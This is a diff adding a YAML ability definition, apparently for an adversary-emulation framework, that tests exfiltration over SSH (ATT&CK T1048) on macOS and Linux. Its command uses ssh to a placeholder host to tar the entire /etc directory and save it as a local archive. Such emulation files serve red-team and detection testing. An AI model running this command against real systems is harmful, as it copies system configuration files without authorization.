@@ -1,0 +1,28 @@
+---
+- id: 5ac7f6ec1898d8d408f9cdc687262cc7
+  name: Exfiltration Over Alternative Protocol - SSH
+  description: 'Input a domain and test Exfiltration over SSH
+
+
+    Remote to Local
+
+
+    Upon successful execution, sh will spawn ssh contacting a remote domain (default:
+    target.example.com) writing a tar.gz file.
+
+    '
+  tactic: exfiltration
+  technique:
+    attack_id: T1048
+    name: Exfiltration Over Alternative Protocol
+  platforms:
+    darwin:
+      sh:
+        command: ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
+        payloads: []
+        cleanup: ''
+    linux:
+      sh:
+        command: ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
+        payloads: []
+        cleanup: ''
